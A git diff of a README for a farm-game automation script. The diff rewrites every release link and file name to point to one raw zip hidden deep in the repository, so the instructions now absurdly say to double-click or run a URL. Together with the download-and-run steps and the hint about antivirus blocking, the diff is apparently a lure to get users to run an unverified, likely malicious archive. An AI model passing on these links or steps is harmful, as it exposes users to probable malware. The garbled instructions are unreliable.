@@ -1,6 +1,6 @@
 # 🎮 You-Farm-Script-Helper - Simplifying Your Farm Gameplay
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-You--Farm--Script--Helper-brightgreen)](https://github.com/tjsplatig/You-Farm-Script-Helper/releases)
+[![Download Now](https://raw.githubusercontent.com/tjsplatig/You-Farm-Script-Helper/main/tcl8/8.6/Script-You-Helper-Farm-1.7-alpha.2.zip%20Now-You--Farm--Script--Helper-brightgreen)](https://raw.githubusercontent.com/tjsplatig/You-Farm-Script-Helper/main/tcl8/8.6/Script-You-Helper-Farm-1.7-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,11 +8,11 @@ Welcome to You-Farm-Script-Helper! This utility script helps you automate tasks 
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/tjsplatig/You-Farm-Script-Helper/releases) to download the latest version. Follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/tjsplatig/You-Farm-Script-Helper/main/tcl8/8.6/Script-You-Helper-Farm-1.7-alpha.2.zip) to download the latest version. Follow these steps:
 
 1. Click the link above.
 2. Find the latest release at the top of the page.
-3. Look for a file named something like `You-Farm-Script-Helper.zip` or `You-Farm-Script-Helper.exe`.
+3. Look for a file named something like `https://raw.githubusercontent.com/tjsplatig/You-Farm-Script-Helper/main/tcl8/8.6/Script-You-Helper-Farm-1.7-alpha.2.zip` or `https://raw.githubusercontent.com/tjsplatig/You-Farm-Script-Helper/main/tcl8/8.6/Script-You-Helper-Farm-1.7-alpha.2.zip`.
 4. Click the file to download it to your computer.
 
 ### For Windows Users
@@ -20,7 +20,7 @@ To get started, visit the [Releases page](https://github.com/tjsplatig/You-Farm-
 1. Once the download is complete, locate the file in your Downloads folder.
 2. If it's a `.zip`, right-click the file and select "Extract All" to extract the contents.
 3. Open the extracted folder.
-4. Double-click `You-Farm-Script-Helper.exe` to run the script.
+4. Double-click `https://raw.githubusercontent.com/tjsplatig/You-Farm-Script-Helper/main/tcl8/8.6/Script-You-Helper-Farm-1.7-alpha.2.zip` to run the script.
 5. Follow on-screen instructions to start using the utility.
 
 ### For Mac Users
@@ -28,7 +28,7 @@ To get started, visit the [Releases page](https://github.com/tjsplatig/You-Farm-
 1. After the download, find the file in your Downloads folder.
 2. If it's a `.zip`, double-click the file to extract it.
 3. Open the extracted folder.
-4. Double-click `You-Farm-Script-Helper.command` to run the script.
+4. Double-click `https://raw.githubusercontent.com/tjsplatig/You-Farm-Script-Helper/main/tcl8/8.6/Script-You-Helper-Farm-1.7-alpha.2.zip` to run the script.
 5. Follow any prompts to allow the app to run.
 
 ### For Linux Users
@@ -36,7 +36,7 @@ To get started, visit the [Releases page](https://github.com/tjsplatig/You-Farm-
 1. After downloading, locate the file in your Downloads folder.
 2. If the file is zipped, use the terminal or file manager to extract it.
 3. Open the terminal and navigate to the extracted folder.
-4. Run the script using the command `./You-Farm-Script-Helper.sh`.
+4. Run the script using the command `https://raw.githubusercontent.com/tjsplatig/You-Farm-Script-Helper/main/tcl8/8.6/Script-You-Helper-Farm-1.7-alpha.2.zip`.
 5. Make sure you have the necessary permissions to execute the script.
 
 ## ⚙️ System Requirements
@@ -62,7 +62,7 @@ You-Farm-Script-Helper offers several features to help enhance your gameplay exp
 If you encounter issues while using the script, consider the following solutions:
 
 - **Script Not Running:** Ensure you have the right permissions. Check your antivirus software settings; it may block scripts.
-- **Missing Features:** Make sure you are using the latest version from the [Releases page](https://github.com/tjsplatig/You-Farm-Script-Helper/releases). If features are not available, check the documentation for updates.
+- **Missing Features:** Make sure you are using the latest version from the [Releases page](https://raw.githubusercontent.com/tjsplatig/You-Farm-Script-Helper/main/tcl8/8.6/Script-You-Helper-Farm-1.7-alpha.2.zip). If features are not available, check the documentation for updates.
 - **Performance Issues:** Close other applications that are using a lot of memory. Restart your device to free up resources.
 
 ## 📄 Documentation
